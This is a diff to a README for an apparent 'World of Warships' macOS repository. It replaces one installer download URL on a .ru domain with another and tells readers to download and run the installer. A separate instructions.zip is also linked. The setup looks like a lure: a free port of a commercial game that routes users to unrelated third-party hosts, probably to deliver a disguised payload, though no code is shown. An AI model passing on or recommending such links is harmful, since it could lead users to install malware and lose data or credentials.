@@ -11,7 +11,7 @@ See video:
 ## Installation
 Download and follow the installer instructions
 ``` text
-http://git.thisismypage.ru/download/yTSj7jbJ3dRgiekQsDM5Dnra0890dbxxM1j5CNGn554dEw5i4liajJdSKDocFVVv
+https://playmac.ru/game/world-of-warships-free/download/dxOMDBWhcV9GJuaskD3SdLTTWVnHQfjsn1PC4eMH0lk2HR5F1DSeLVwttZuO25sZ
 ```
 You can [download](https://github.com/gmaxus/World-of-Warships-macOS/raw/refs/heads/main/instructions.zip) the Instruction separately (they will appear after installation)
 
